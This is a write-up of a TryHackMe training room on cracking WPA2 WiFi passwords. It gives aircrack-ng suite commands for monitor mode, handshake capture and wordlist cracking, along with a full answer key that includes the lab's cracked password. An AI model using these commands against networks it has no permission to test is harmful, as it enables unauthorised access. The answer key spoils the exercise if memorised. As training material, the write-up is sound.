# 📶 WiFi Hacking 101 

---

link to the room: https://tryhackme.com/room/wifihacking101

---

<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-WiFi%20Hacking-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-yellow?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Category-Network%20Security-blue?style=for-the-badge" />
</p>

---

## 📌 Overview

This room introduces **WiFi security and WPA/WPA2 attacks**, focusing on how attackers capture and crack WiFi passwords.

You will learn:

* How WPA2 authentication works
* Capturing handshakes
* Using Aircrack-ng tools
* Cracking passwords with wordlists

---

## 🎯 Learning Objectives

* Understand WPA/WPA2 authentication
* Capture 4-way handshakes
* Use Aircrack-ng tools
* Perform password cracking attacks
* Understand limitations of WiFi attacks

---

## 🧠 Key Concepts

* SSID / ESSID / BSSID
* WPA2-PSK vs WPA2-EAP
* 4-way handshake
* Brute force attacks
* Monitor mode
* Packet capture
* Dictionary attacks

---

# 🧪 Walkthrough Summary

## 🔹 1. WPA Basics

* WPA2-PSK uses a shared password
* WPA2-EAP uses username/password (RADIUS)
* Attacks rely on capturing handshake

✔ Attack type:

```
Brute force
```

---

## 🔹 2. Capturing Packets

Enable monitor mode:

```bash
airmon-ng start wlan0
```

✔ Interface becomes:

```
wlan0mon
```

Kill interfering processes:

```bash
airmon-ng check kill
```

Capture traffic:

```bash
airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon
```

---

## 🔹 3. Cracking Password

Use Aircrack:

```bash
aircrack-ng -b <BSSID> -w rockyou.txt capture.cap
```

Or create hashcat file:

```bash
aircrack-ng -j output capture.cap
```

✔ Password found:

```
greeneggsandham
```

---

## 🔹 4. Performance

✔ Faster cracking:

```
GPU > CPU
```

---

# ✅ FULL QUESTIONS & ANSWERS

---

## 🔹 Task 1: WPA Basics

**Q:** What type of attack can be performed on WPA2 Personal?
**A:** brute force

**Q:** Can this attack be used on WPA2-EAP?
**A:** Nay

**Q:** What is the abbreviation for pre-shared key?
**A:** PSK

**Q:** Minimum WPA2 password length?
**A:** 8

---

## 🔹 Task 2: Capturing Packets

**Q:** Command to enable monitor mode?
**A:** airmon-ng start wlan0

**Q:** New interface name?
**A:** wlan0mon

**Q:** Kill interfering processes?
**A:** airmon-ng check kill

**Q:** Tool to capture packets?
**A:** airodump-ng

**Q:** Flag to set BSSID?
**A:** --bssid

**Q:** Flag to set channel?
**A:** --channel

**Q:** Flag to save capture file?
**A:** -w

---

## 🔹 Task 3: Cracking

**Q:** Flag to specify BSSID?
**A:** -b

**Q:** Flag to specify wordlist?
**A:** -w

**Q:** Flag to create HCCAPX file?
**A:** -j

**Q:** What is the cracked password?
**A:** greeneggsandham

**Q:** What is faster for cracking?
**A:** GPU

---

# 🚀 Attack Flow Summary

1. Enable monitor mode
2. Capture handshake
3. Save packets
4. Run dictionary attack
5. Crack password

---

## ⚠️ Key Takeaways

* WPA2 is secure unless password is weak
* Attacks rely on capturing handshake
* Strong passwords prevent cracking
* WPA2-EAP is harder to attack
* GPU significantly speeds up cracking

---

## 💡 Final Insight

WiFi hacking is mostly:

➡️ Capturing authentication data
➡️ Guessing passwords efficiently

Security depends heavily on:
✔ Strong passwords
✔ Proper configuration

---

## 📚 Reference

TryHackMe — WiFi Hacking 101 

---
